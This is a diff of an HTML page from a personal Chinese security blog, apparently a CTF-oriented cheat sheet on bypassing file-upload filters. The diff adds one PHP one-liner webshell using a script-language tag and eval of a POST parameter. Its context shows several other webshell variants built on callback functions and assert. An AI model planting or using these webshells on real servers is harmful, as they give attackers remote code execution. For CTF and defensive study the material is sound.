@@ -16,7 +16,7 @@
 <meta property="og:site_name" content="cruoni的博客">
 <meta property="og:description" content="文件上传[toc] 绕过方法 burp抓包 改后缀绕过 1.php .jpg  00截断绕过 图片马 + 解析漏洞绕过 图片马制作方法：  12# Windows DOS:copy 1.jpg/b + 2.php/a tu.jpg  特殊的PHP代码格式.php4 .php5也能被解析 （fast-cgi）里配置正则检测文件内容中包含 &amp;lt;? 就异常退出，通常的PHP代码就不行了，可以使用这种">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2019-08-14T08:26:51.540Z">
+<meta property="og:updated_time" content="2019-08-14T08:30:27.326Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="upload 文件上传绕过方法总结">
 <meta name="twitter:description" content="文件上传[toc] 绕过方法 burp抓包 改后缀绕过 1.php .jpg  00截断绕过 图片马 + 解析漏洞绕过 图片马制作方法：  12# Windows DOS:copy 1.jpg/b + 2.php/a tu.jpg  特殊的PHP代码格式.php4 .php5也能被解析 （fast-cgi）里配置正则检测文件内容中包含 &amp;lt;? 就异常退出，通常的PHP代码就不行了，可以使用这种">
@@ -180,6 +180,7 @@
 <p>读取flag.php 可以使用连接字符串绕过或strtolower(‘PHP’)绕过<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> &lt;script language=<span class="string">"PHP"</span>&gt;</span><br><span class="line"><span class="keyword">echo</span>((file_get_contents(<span class="string">'../flag.'</span>.<span class="string">'p'</span>.<span class="string">'h'</span>.<span class="string">'p'</span>)));</span><br><span class="line"> &lt;/script&gt;</span><br><span class="line"> <span class="comment">#查看页面源代码</span></span><br></pre></td></tr></table></figure></p>
 <p><a href="https://blog.csdn.net/yilovexing/article/details/52711673" target="_blank" rel="noopener">php读取文件的五种方式</a></p>
 <h2><span id="php一句话">php一句话</span></h2><p><code>&lt;?</code>被过滤可用 <code>&lt;script language=&quot;PHP&quot;&gt; echo(&quot;test&quot;)&lt;/script&gt;</code>绕过</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">"php"</span>&gt;@eval_r($_POST[pass])&lt;/script&gt;</span><br></pre></td></tr></table></figure>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$e = $_REQUEST[<span class="string">'e'</span>];</span><br><span class="line">register_shutdown_function($e, $_REQUEST[<span class="string">'pass'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$e = $_REQUEST[<span class="string">'e'</span>];</span><br><span class="line"><span class="keyword">declare</span>(ticks=<span class="number">1</span>);</span><br><span class="line">register_tick_function ($e, $_REQUEST[<span class="string">'pass'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">filter_var($_REQUEST[<span class="string">'pass'</span>], FILTER_CALLBACK, <span class="keyword">array</span>(<span class="string">'options'</span> =&gt; <span class="string">'assert'</span>));<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
@@ -418,11 +419,23 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">WriteUp,PHP</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">WriteUP</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">XCTF WriteUP</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">web php</a>
+                <a href="javascript:void(0)" class="js-tag color3">web,php</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">wp</a>
               </li>
             
             <div class="clearfix"></div>
